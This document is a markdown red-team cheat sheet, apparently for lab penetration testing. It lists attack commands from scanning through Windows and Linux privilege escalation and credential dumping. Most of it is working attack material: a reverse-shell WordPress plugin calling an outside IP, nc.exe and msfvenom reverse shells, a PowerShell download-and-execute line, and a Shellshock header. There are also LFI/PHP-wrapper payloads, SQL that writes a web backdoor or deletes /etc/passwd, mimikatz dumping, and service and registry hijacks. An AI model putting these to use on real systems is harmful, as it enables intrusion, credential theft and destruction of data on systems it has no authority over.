---
title: "The Red Team Cheat Sheet"
created: 2023-10-26
modified: 2023-10-26
tags: ["Penetration-Testing"]
draft: false
---

## Methodology

Enumerate TCP ports:

```bash
# Quick TCP Scan
rustscan -a "[IP]"

# Aggressive Scan
nmap -sV -sC -p "[PORTS]" "[IP]" -o nmap.result

# Nmap UDP Scan
nmap -sU --top-ports 100 "[IP]"
```

Connect to ports using Netcat:

```bash
nc -nv "[IP]" "[PORT]"
```

Brute-Force Directories:

```bash
# Gobuster
gobuster dir -u "[URL]" -w /usr/share/wordlists/dirbuster/

# Ffuf
fuff -u "http://[IP]:[PORT]/FUZZ" -w "/usr/share/wordlists/dirb/common.txt" -e txt,php,exe
```

* OSINT
	* Default Credentials.
	* Collect emails.
	* Collect usernames.
	* Collect passwords.

* Exploit
	* Search for exploit on **GitHub**
	* Search for exploit on **ExploitDB**
	* Modifying the IP-Address
	* Modifying the Port

Brute-Force:

```bash
# FTP
sudo hydra -l "[USERNAME]" -P /usr/share/wordlists/rockyou.txt "ftp://[IP]"

# SSH
sudo hydra -l "[USERNAME]" -P /usr/share/wordlists/rockyou.txt "ssh://[IP]"

# SMB
sudo hydra -l "[USERNAME]" -P /usr/share/wordlists/rockyou.txt "smb://[IP]"
```

* Web Application
	* Local File Inclusion & Remote File Inclusion
	* OS Command Injection
	* SQL Injection
	* Web Browser Cookies
	* HTML Code
	* Web Application Version
	* Default Credentials
	* Register Account With Company Email

Internal:

```bash
# Linux: Port Check
echo 1 > /dev/tcp/[IP]/[PORT]; echo $?
```
## Port Enumeration

Nmap & Rustscan:

```bash
# Quick Port Scanning
rustscan -a "[IP]"
nmap -p- "[IP]"

# Scanning for UDP Ports
nmap -sU --top-ports 50 "[IP]"

# Scanning for TCP Ports
nmap -sT --top-ports 50 "[IP]"

# Intrusive Scanning
nmap -sV -sC -p- "[IP]" 
```

Netcat:

```bash
nc -nv "[IP]" "[PORT]"
```

* `help`
* `info`
* `/bin/bash -c whoami`
* `whoami`
* `assist`

## OSINT

It's highly recommended to always collect information's about the target.

* Firstname & Lastname
* Email
* Documents
* Application version

## Web Enumeration

### Directory

Installation:

```bash
sudo apt-get install gobuster
```

Commands:

```bash
# Directory enumeration
nmap -p 80 --script=http-enum "[IP]"

# HTTP directory enumeration
gobuster dir -u "http://[IP]:[PORT]/" -w "/usr/share/wordlists/dirb/common.txt"

gobuster dir -u "http://[IP]:[PORT]/" -w "/usr/share/wordlists/dirb/directory-list-2.3-small.txt"

# HTTPS directory enumeration
gobuster dir -k -u "https://[IP]:[PORT]/" -w "/usr/share/wordlists/dirb/common.txt"

gobuster dir -k -u "https://[IP]:[PORT]/" -w "/usr/share/wordlists/dirb/directory-list-2.3-small.txt"

# Different extenstions
gobuster dir -u "http://[IP]:[PORT]/" -w "/usr/share/wordlists/dirb/directory-list-2.3-small.txt" -x txt

# Faster files/directory enuemration
fuff -u "http://[IP]:[PORT]/FUZZ" -w "/usr/share/wordlists/dirb/common.txt" -e txt
```
### Parameters

Parameter Brute-Force:

```bash
# Non authenticated
ffuf -c -r -u 'http://192.168.190.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 0

# Authenticated
ffuf -c -r -u 'http://192.168.190.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 0 -b 'PHPSESSID=...'
```
### Error Messages

When an error message occurs we should always take a note of it since it could help us with our initial foothold access onto the target.

### API

```bash
# Obtain information about API
curl -i "[DOMAIN]:[PORT]/[API-DIR]"

# Send POST or GET request
curl –v –X OPTIONS "[DOMAIN]:[PORT]/[API-DIR]"

# Including JSON into request: Register
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' "http://[DOMAIN]/[API-DIR]"

# Including JSON into request: Login
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' "http://[DOMAIN]/[API-DIR]"

# Plaintext POST Request
curl -X POST --data '[PARAMETER]=' "[DOMAIN]"
```
### Git

```bash
# Git-dumper Installation
pip install git-dumper

# Download `.git` folder
wget "http://[IP]:[PORT]/.git"

# Enumerate `.git` folder
git logs
git show "[COMMIT]"
```
### LFI & RFI

File Inclusion:

```bash
?lang=en-page.php

# LFI: Linux
?lang=/etc/passwd

# LFI: Windows
?lang=/boot.ini

# SMB Service
sudo systemctl restart smbd

?lang=\\[IP]\temp\rev.php

# HTTP Service
python3 -m http.server -m

?lang=http://[IP]/rev.php
```

PHP Wrapper:

```bash
# PHP Wrapper
data://text/plain,<? php echo shell_exec("dir") ?>

# PHP Wrapper Base64
data://text/plain,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pgo=

# Display `admin.php` as Base64
php://filter/convert.base64-encode/resource="[DISPLAY-FILE]"

# Example 1
menu.php?file=data://text/plain,<?php echo shell_exec("dir")?>

# Example 2
menu.php?file=data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pgo=

# Example 3
menu.php?file=php://filter/convert.base64-encode/resource="[DISPLAY-FILE]"
```
### CGI-Bin

Bruteforcing CGI-Bin:

```bash
# Brute-Forcing
ffuf -u "http://[IP]/cgi-bin/FUZZ" -w "/usr/share/wordlists/dirb/common.txt" -e ".cgi, .sh, .pl"

# Exploit
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' "http://10.10.10.56/cgi-bin/[SCRIPT-NAME]"
```
### File Upload

.htaccess:

```bash
echo "AddType application/x-httpd-php .xxx" > .htaccess
```

Commands:

```bash
# Add `89 50 4E 47 0D 0A 1A 0A` into the beginning
hexeditor "reverse-shell.php"
```

File Extensions Names:
- `file.png.php`
- `file.png.pHp5`
- `file.php#.png`
- `file.php%00.png`
- `file.php\x00.png`
- `file.php%0a.png`
- `file.php%0d%0a.png`
- `file.phpJunk123png`
- `file.png.php`
- `file.png.Php5`

Resources
* [List Of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

### SQL Injection

MSSQL Injection Commands:

```sql
admin'; EXEC xp_cmdshell "ping [IP]"; --
admin'; EXEC "sp_configure 'xp_cmdshell', '1'"; --
admin'; EXEC xp_cmdshell "powershell -e JABjAGwAaQBl..."; --
```

SQL Injection Commands:

```sql
admin'; show tables; --
admin'; select * from users; ---
admin'; INSERT INTO "users" (id, name, password) VALUES (NULL, NULL, NULL); --
```
### PostgreSQL

Default Credential:

* `postgres:postgres`

PSQL Login Command:

```bash
psql -h "[TARGET-IP]" -U "[USERNAME]" -W
```

PSQL Database Commands:

```mysql
# Shows version
SELECT VERSION();

# Shows tables
/d

# List tables from current schema
\dt

# Lists tables from all schema
\dt <name-of-schema>.*
```
### MySQL

Default Credentials
* `root:root`
* `root:toor`
* `root:no password`

### WordPress

WPScan Commands:

```bash
# Update WPScan
wpscan --update

# Enumerates through plugins
wpscan --url "[TARGET]" --enumerate p --plugins-detection aggressive

# Enumerates vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url "[TARGET]" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Brute Force
wpscan --url "[TARGET]" --usernames "[USERNAMES]" --passwords "[PASSWORDS]"
```

WordPress Database Enumeration:

```sql
# Searching through WordPress options
select * from wp_options;
```

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.152/80 0>&1'");
?>
```
### PhpMyAdmin

Default Credentials:
* `root:root`
* `root:no password`

PHP Backdoor:

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"

SELECT "root:$1$ARg8T8zS$sKQkSE6vj8uppky8/EbOV0:0:0:root:/root:/bin/bash" >> "/etc/passwd"

\! rm -f /etc/passwd
```

PHP Reverse Shell:

```sql
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

## Credentials

Once we obtain credentials we should always try to re-use them:

Default Passwords:
* `admin:admin`
* `root:root`
* `administrator:password`
* `admin:password`

Passwordless (PhpMyAdmin):
* `root`
* `admin`
* `administrator`

We should always research if the application has a default credentials logins too.

## Steganography

* Steganography String: `%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz` 
* Steganography String: `&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz`

Extract File from `.jpg`:

```bash
steghide extract -sf "JPG-FILE"
```

Brute-Force Passwords:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt); do echo '[+] Trying ' $i; steghide extract -sf "JPG-FILE" --passphrase $i; done 
```
## SSH Key

SSH Keys:

* `id_ecdsa`
* `id_rsa`

Commands:

```bash
# Generate SSH Key
ssh-keygen

# Permission
chmod -R 600 id_rsa

# 1. Transfer the file `id_rsa.pub` to target machine as `authorized_keys`
# 2. Login using the `id_rsa` key
```

## Service Enumeration

### SMTP - 25

Telnet & Netcat:

```bash
telnet "[IP]" "[PORT]"
nc -nv "[IP]" "[PORT]"
```

Nmap:

```bash
# Searches for available commands
nmap -p "25,465,587" --script=smtp-commands "[IP]"

# Searches for users
nmap -p "25,465,587" --script=smtp-enum-users "[IP]"

# Information disclosure (OS, NetBIOS, and DNS)
nmap -p 587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain="example.com" "[IP]"
```

Swaks Commands:

```bash
swaks --from 'username@example.com' --to "username@example.com" --attach "/ftphome/config.library-ms" -s "[SERVER-IP]" --header "Subject: Urgent" --body "Message" --suppress-data -ap
```
### DNS - 53

Host Commands:

```bash
# Nameserver
host -t NS "[IP]"

# Displays DNS Zone Transfer information
host -l "example.com" "10.0.0.0"

# Displays `TXT` of domain 
host -t txt -l "example.com" "10.0.0.0"
```

Dig Commands:

```bash
# Banner Grabbing
dig version.bind CHAOS TXT "@10.0.0.0"

# DNS Zone Transfer
dig axfr "@10.0.0.0" "example.com"
```

DNSRecon Commands:

```bash
# Enumerate DNS
sudo dnsrecon -d "[DOMAIN]" -t axfr

# Brute-Force Subdomains with DNSRecon
sudo dnsrecon -d "[DOMAIN]" -D "[SUB-DOMAIN]" -t brt
```

DNSEnum Commands:

```bash
dnsenum "[DOMAIN]"
```
### Finger - 79

Commands:

```bash
# Searching for users
./finger-user-enum.pl -t "[IP]" -U "/usr/share/seclists/Usernames/Names/names.txt"

# Shows information about user
finger -s "[USER]@[HOST]"

# Shows home directory of user
finger -sl "[USER]@[HOST]"

# All informations
finger -slp "[USER]@[HOST]"
```

Resource:
* [Finger-User-Enum](https://github.com/pentestmonkey/finger-user-enum)

### SMB - 139, 445

SMB Vulnerability Scanner:

```bash
nmap "[IP]" --script smb-vuln-*
```

SMB Version Detector:

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set rhosts "[IP]"
run
```

SMBClient Commands:

```bash
# List shares
smbclient -L "\\\\[IP]\\"

# Login as anonymous
smbclient "\\\\[IP]\\[SHARE]" -U anonymous

# Login as a user
smbclient "\\\\[IP]\\[SHARE]" -U "[USERNAE]"

# Download everything
mask ""
recurse ON
prompt OFF
mget *
```

Enum4Linux Commands:

```bash
# Unauthenticated enumeration
enum4linux -a "[IP]"

# Authenticated enumeration
enum4linux -a -u "[USERNAME]" -p "[PASSWORD]" "[IP]"
```
### SNMP - 161,  162

Identifying Commands:

```bash
# Community strings
echo "public" > community
echo "private" >> community
echo "manager" >> community

# List of machines
for i in $(seq 1 254); do echo "192.168.0.$i" >> ips.txt; done

# Identify machines running SNMP
onesixyone -c community -i ips.txt
```

Enumeration Commands:

```bash
# All
snmpwalk -c public -v1 -t 1 "[IP]"

# Running Processes
snmpwalk -c public -v1 "[IP]" "1.3.6.1.2.1.25.1.6.0"

# Open Ports
snmpwalk -c public -v1 "[IP]" "1.3.6.1.2.1.6.13.1.3"

# nsExtendObjects
snmpwalk -v 1 -c public "[IP]"  NET-SNMP-EXTEND-MIB::nsExtendObjects
```
### Squid - 3128

Commands:

```bash
# Curl with proxy
curl --proxy "http://[IP]:3128" "http://[IP]/"

# /etc/proxychains 
http "[IP]" 3128

# /etc/proxychains with credentials
http "[IP]" 3128 "[USERNAME]" "[PASSWORD]"
```

Spose Commands:

* [Spose](https://github.com/aancw/spose)

```bash
python spose.py --proxy "http://[IP]:3128" --target "[IP]"
```
### VoIP - 5060

Resources:
* [Pentesting VoIP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-voip)
* [Sippts](https://github.com/Pepelux/sippts)

Commands:

```bash
python3 sipdigestleak.py -i "[TARGET-IP]"
```

Decoding Raw File:

```bash
# The `8000` is the 8000 HZ
sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav
```
### gRPC - 50051

```bash
# Interacting through CLI
grpcurl --plaintext "[URL]:[PORT]"

# Interacting through GUI
./grpcui --plaintext "[IP]:[PORT]"
```
## Brute-Force

### Hydra

```bash
# SSH
hydra -L usernames.txt -P passwords.txt "ssh://[IP]"

# RDP
hydra -L usernames.tct -P passwords.txt "rdp://[IP]"

# WEB POST
hydra -L usernames.txt -P "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" "[IP]" http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# WEB GET
sudo hydra -l user -P "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" "[IP]" http-get "/"
```
### CrackMapExec

```bash
# SMB
cme smb "[IP]" -u "[USERNAME-LIST]" -p "[PASSWORD-LIST]" --continue-on-success

# SMB List Shares
cme smb "[IP]" -u "[USERNAME-LIST]" -p "[PASSWORD-LIST]" --shares

# RDP
cme smb "[IP]" -u "[USERNAME-LIST]" -p "[PASSWORD-LIST]" --continue-on-success -M rdp -o ACTION='enable'

# SSH
cme ssh "[IP]" -u "[USERNAME-LIST]" -p "[PASSWORD-LIST]" --continue-on-success
```
### Evil-WinRM

Commands:

```bash
# Credentials
evil-winrm -i "[IP]" -u "[USERNAME]" -p "[PASSWORD]"

# Hash
evil-winrm -i "[IP]" -u "[USERNAME]" -H "[HASH]"

# Evil-winrm & Mimikatz
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```
## Exploit

Commands:

```bash
sudo ifconfig tun0 mtu 750 
```

Exploit Websites:
* [PacketStormSecurity](https://packetstormsecurity.com/)
* [ExploitDB](https://www.exploit-db.com/)

Always change the:
* IP-Address
* Port Number
* Directory

## File Transfer

PowerShell Command:

```powershell
# Instantly executing powershell script
IEX(New-Object Net.WebClient).Download("http://10.10.16.11/Sherlock.ps1");Invoke-Sherlock
```

Certutils Command:

```powershell
certutil.exe -urlcache -split -f http://10.10.16.11/reverse-shell-1.php reverse-shell-1.php
```

SMB File Execute:

```powershell
cmd.exe /c //192.168.45.246/temp/nc.exe -e cmd.exe 192.168.45.246 80
```

File Upload One-liner:

```bash
# Create directory
mkdir "/var/www/html/uploads"

# Create a `upload.php` file
echo '<!DOCTYPE html> <html> <head> <title>Upload your files</title> </head> <body> <form enctype="multipart/form-data" action="upload.php" method="POST"> <p>Upload your file</p> <input type="file" name="uploaded_file"></input><br /> <input type="submit" value="Upload"></input> </form> </body> </html> <?PHP if(!empty($_FILES["uploaded_file"])) { $path = "/"; $path = $path . basename( $_FILES["uploaded_file"]["name"]); if(move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $path)) { echo "The file ".  basename( $_FILES["uploaded_file"]["name"]). " has been uploaded"; } else{ echo "There was an error uploading the file, please try again!"; } } ?>' > /var/www/html/upload.php
```

Linux Python HTTP Server:

```python
python3 -m http.server 80
```

Windows Simple HTTP Server:
* [Simpe-HTTP-Server](https://github.com/TheWaWaR/simple-http-server/releases/tag/v0.6.7)

```powershell
.\simple-http-server.exe
```

SMBServer:

```bash
# Start Server
impacket-smbserver smbfolder $(pwd) -smb2support -user offsec -password offsec

# Transfer files
copy "[FILE-NAME]" \\IP\\smbfolder
```

## Tunneling

### SSH

Local Port Forwarding:

```bash
ssh -N -L "0.0.0.0:[LOCAL-PORT]:[TARGET-IP]:[TARGET-PORT]" "[USERNAME]@[IP]"
```

Dynamic Port Forwarding:

```bash
# SSH Command
ssh -N -D "0.0.0.0:1080" "[USERNAME]@[IP]"

# Add "socks5 127.0.0.1 1080" into "/etc/proxychains4.conf"
socks5 "127.0.0.1" "1080"

# Example command
proxychain -q nmap "[IP]"
```

Remote Port Forwarding:

```bash
# Start SSH
sudo systemctl start ssh

# SSH Command
ssh -N -R "127.0.0.1:[LOCAL-PORT]:[TARGET-IP]:[TARGET-PORT]" "kali@[LOCAL-IP]"
```

Remote Dynamic Port Forwarding:

```bash
# Start SSH Service
sudo systemctl start ssh

# SSH Command
ssh -N -R 1080 kali@192.168.118.4

# Add "socks5 127.0.0.1 1808" into "/etc/proxychains4.conf"
socks5 "127.0.0.1" "1080"

# Execute commands use "proxychains"
proxychains -q nmap --top-ports 1080 "[IP]" 
```
### Chisel

Local Port Forwarding:

```bash
#Chisel Server (LOCAL-MACHINE)
chisel server --port 8080 --reverse --socks5

# Chisel Client (TARGET-MACHINE)
chisel client "[LOCAL-IP]:[LOCAL-PORT]" R:[LOCAL-PORT-TO-FORWARD]:[TARGET-IP]:[TARGET-PORT]
```

Dynamic Port Forwarding:

```bash
# Chisel Server (LOCAL-MACHINE)
chisel server --port 8080 --reverse --socks5

# Chisel Client (TARGET-MACHINE)
.\chisel.exe client "[LOCAL-IP]:[LOCAL-PORT]" R:1080:socks
```

## Linux Privilege Escalation

### Credentials

Enumeration:
* Enumerate through users table on MySQL.
* Enumerate through files such as `config.php`.

Credentials Re-use:
* `[USERNAME]:[USERNAME]`

### Commands

```bash
# Spawn a shell
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
stty raw-echo;fg;reset
stty columns 200 rows 200

# Overview of user
id
groups

# Hostname
hostname

# Kernel
uname -a

# Sudo permissions
sudo -l
sudo -i

# Which commands
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which mcat
which nc.traditional
which socat

# Process information
cat "/proc/version"

# Operating system
file /bin/bash
cat "/proc/issue"
cat "/etc/*-release"

# Kernel Drivers
lsmod

# Information about specific driver
/sbin/modinfo libata

# Running Processes
ps -aux

# Environment variables
env

# Lists SUDO commands
sudo -l

# See all users (potentially brute-force attack)
cat "/etc/passwd"

# Is anything vulnerable running as root
ps aux | grep -i 'root' --color=auto

# See users SSH Keys
cat "/home/[USER]/.ssh/id_rsa"
cat "/home/[USER]/.ssh/id_rsa.pub"

# Lists entered commands
history

# Network interface informations
ifconfig
netstat -antup
netstat -tunlp

# Writable folders
find / -writable -type d 2>/dev/null

# Searching for SUID
find / -perm -u=s -type f 2>/dev/null

# Searching for GUID
find / -perm -g=s -type f 2>/dev/null

# Searching for config directories
find / -type d -name config 2>/dev/null

# Searching for config.txt file
find / -type f -name config.txt 2>/dev/null

# Quick look at:
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp
ls -lsaht /dev/shm/
ls -lsaht /var/mail

# NFS Permissions?
cat /etc/exports

# Capabilities Privilege Escalation
getcap
getcap -r / 2>/dev/null

# Cronjobs
cat "/etc/crontab"
cat "/var/log/cron.log"
grep "CRON" "/var/log/syslog"
crontab -u root -l

# Mounted filesystems
cat "/etc/fstab"

# Available disks
lsblk
```
### Change Password

```bash
# Generate openssl hash
openssl passwd root

# Assign hash to root user
echo "root2:[HASH]:0:0:root:/root:/bin/bash" >> /etc/passwd
```
### Path Variables

```bash
echo $PATH
PATH=/tmp:$PATH
nano "/tmp/[PAYLOAD]"

# Payload
echo "#!/bin/bash" > "[EXECUTABLE-NAME]"
echo "chmod -R 7777 /bin/bash"
```
### NFS

```bash
cat "/etc/exports" # no_root_squares enabled allows us to create root files
showmount -e "[IP]"
mount -o rw "[TARGET-IP]:[DIR]" "[MOUNT-DIR]"
```
### Groups

Disk Group:

```bash
debug fs /dev/sda2
```

Reboot Privilege Escalation:

```bash
# Searching for writeable services
find / -writable -name "*.service" 2>/dev/null

# Inserting payload into the service
echo "[Unit]" >> "[SERVICE-LOCATION]"
echo "Description=Zeno monitoring" >> "[SERVICE-LOCATION]"

echo "[Service]" >> "[SERVICE-LOCATION]"
echo "Type=simple" >> "[SERVICE-LOCATION]"
echo "User=root" >> "[SERVICE-LOCATION]"
echo "ExecStart=/bin/bash -c 'chmod -R 7777 /bin/bash'" >> "[SERVICE-LOCATION]"

echo "[Install]" >> "[SERVICE-LOCATION]"
echo "WantedBy=multi-user.target" >> "[SERVICE-LOCATION]"

# Restart machine
sudo /usr/sbin/reboot
```
### Exiftool

* [CVE-2021-22204](https://www.exploit-db.com/exploits/50911)

```bash
# Installing extension
sudo apt-get install djuvlibre

# Creating malicious `.jpeg` file
python3 ./-CVE-2021-22204.py -c <command> [-i <image.jpg>]
```

Resources:
* [ExploitNotes](https://exploit-notes.hdks.org/)
* [GTFOBins](https://gtfobins.github.io/)
* [iNotes](https://ihsansencan.github.io/privilege-escalation/linux/binaries/check-ssl-cert.html)
* [S1REN Blog](https://sirensecurity.io/blog/windows-privilege-escalation-resources/)

## Windows Privilege Escalation

### Ldapsearch

```bash
ldapsearch -x -h 192.168.194.165 -b "dc=heist,dc=offsec"
```
### Windows Old Backup

* `C:\Windows.old\system32\config\SAM`
* `C\Windows.old\system32\config\SYSTEM`
* `C:\Windows\Repair\SAM`
* `C:\Windows\Repair\SYSTEM`

```bash
# Extracting SAM & SYSTEM
pypykatz registry --sam SAM SYSTEM

# VSSAdmin Dump
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\

copy \\.\GLOBALROOT\SystemRoot\Windows\NTDS\NTDS.dit c:\users\enox\Downloads\
copy \\.\GLOBALROOT\SystemRoot\System32\config\SYSTEM c:\users\enox\Downloads\

# VSSAdmin: impacket
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```
### Commands

```powershell
# Show User
whoami

# Show groups
whoami /groups

# Show privileges
whoami /priv

# Show alls everything
whoami /all

# CMD: List users
net user
net user /domain

# CMD: List groups
net localgroup
net group /domain

# Powershell: List users
Get-LocalUser

# Powershell: List groups
Get-LocalGroup
Get-LocalGroupMember Administrators

# System information
systeminfo

# Network interface
ipconfig /all

# Network routes
route print

# Scheduled tasks
schtasks /query /fo list /v

# Active network connections
netstat -ano

# Firewall information
netsh firewall show state
netsh firewall show config

# Powershell History
Get-History 
(Get-PSReadlineOption).HistorySavePath

# Cleartext Passwords in files
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /spin "password" .

# 32-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Running processes
Get-Process

# Finding `.txt` documents
Get-ChildItem -Path "C:\Users" -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

# Finding `.ini` documents
Get-ChildItem -Path "C:\Users" -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

# Finding `all` documents
Get-ChildItem -Path "C:\Users" -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Run CMD as other users
runas /user:[NAME] cmd
```
### SeRestorePrivilege

* [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)

```bash
# Enables the privilege
Import-Module .\EnableSeRestorePrivilege.ps1

# Go to system32 directory
cd C:\Windows\System32

# Change the following...
mv utilman.exe utilman.old
mv cmd.exe utilman.exe

# RDP to machine
rdesktop "[IP]"
```
### SeBackupPrivilege

```bash
mkdir temp
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system
pypykatz registry --sam sam system
```
### SeImpoersonatePrivilege & SeAssignPrimaryToken

* [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)

```powershell
# JuicyPotatoNG
.\JuicyPotatoNG -p c:\windows\system32\cmd.exe -a "/c c:\JavaTemp\nc.exe -e cmd.exe [LHOST] [LPORT]" -t *

# PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell

# SweetPotato
.\RottenPotato.exe -p cmd.exe -e EfsRpc
```
### SeManageVolume

* [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

```bash
# Location: /ctf/tools/privilege-escalation
.\SeManageVolumeExploit.exe

# Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o Printconfig.dll

# Transfer `Printconfig.dll` onto machine and execute the following commands
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```

### GMSAPasswordReader

* [Toolies](https://github.com/expl0itabl3/Toolies)

```bash
.\GMSAPasswordReader.exe --accountname '[NAME]'
```

### Service Binary Hijacking

```bash
# Payload
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 -f exe -o shell.exe

# Checks if a service has insecure permissions
.\accesschk.exe /accepteula -uwcqv "[USER]" *

# Displays additional information about the service
sc qc "[APP-NAME]"

# Changes `BINARY_PATH_NAME` to our reverse shell
sc config daclsvc binpath= "\"C:\PrivEsc\shell.exe\""

# Checks the permission of `filepermservice.exe`
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Start Service
net start "[APP-NAME]"

# Stop Service
net stop "[APP-NAME]"

# Start Service
sc.exe start "[APP-NAME]"

# Stop Service
sc.exe stop "[APP-NAME]"
```
### Weak Registry Permissions

```bash
# Searching for weak registry permissions
.\accesschk.exe /accepteula -uvwqk "HKLM\System\CurrentControlSet\Services\regsvc"

# Replacing the weak registry permission to payload
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\shell.exe /f

# Start Service
net start "[APP-NAME]"

# Stop Service
net stop "[APP-NAME]"
```
### Registry Auto-run

```bash
# Searching for weak autorun registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Checking the permission of `[APP-LOCATION]`
C:\PrivEsc\accesschk.exe /accepteula -wvu "[APP-LOCATION]"

# Replacing `program.exe` with `shell.exe` exexutable
copy C:\PrivEsc\shell.exe "C:\Program Files\Autorun Program\program.exe"
```
### Registry AlwaysInstallElevated

```bash
# Querying the registry AlwaysInstallElevated keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Creating Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f msi -o reverse.msi

# Executing MSI file on target
msiexec /quiet /qn /i "C:\PrivEsc\shell.msi"
```
### Saved Credentials

```bash
# Lists all saved credentials
cmdkey /list

# Runs it as administrator since the creds were saved
runas /savecred /user:admin "C:\shell.exe"
```
### Startup Apps

```bash
# Checking if the user can write to StartUp
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# CreateShortcut.VBS
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\shell.exe"
oLink.Save

# Executes the script above
cscript C:\PrivEsc\CreateShortcut.vbs
```

## Windows Post Exploitation

Mimikatz Dumping Cached Credentials:

```bash
# Mimikatz
token::elevate
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords

# Evil-winrm + Mimikatz
.\mimikatz.exe "privilege::debug" "lsadump::sam" "lsadump::tickets" "exit"
```

Other commands:

```bash
# SYSTEM & SAM: impacket
impacket-secretsdump -just-dc-user "[DOMAIN-ADMIN-USERNAME]" "[DOMAIN-NAME]:[USERNAME]:[PASSWORD]@[TARGET-IP]"

# AS-REP Roasting: impacket
impacket-GetNPUsers -dc-ip "[IP]" -request -outputfile hashes.asreproast "[DOMAIN]/[USERNAME]"

# Kerberoast: impacket
impacket-GetUserSPNs -request -dc-ip "[TARGET-IP]" "[DOMAIN]/[USERNAME]"

# ASP-REP Roasting: Rubeus
.\Rubeus.exe asreproast /nowrap

# ASP-REP Roasting: Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

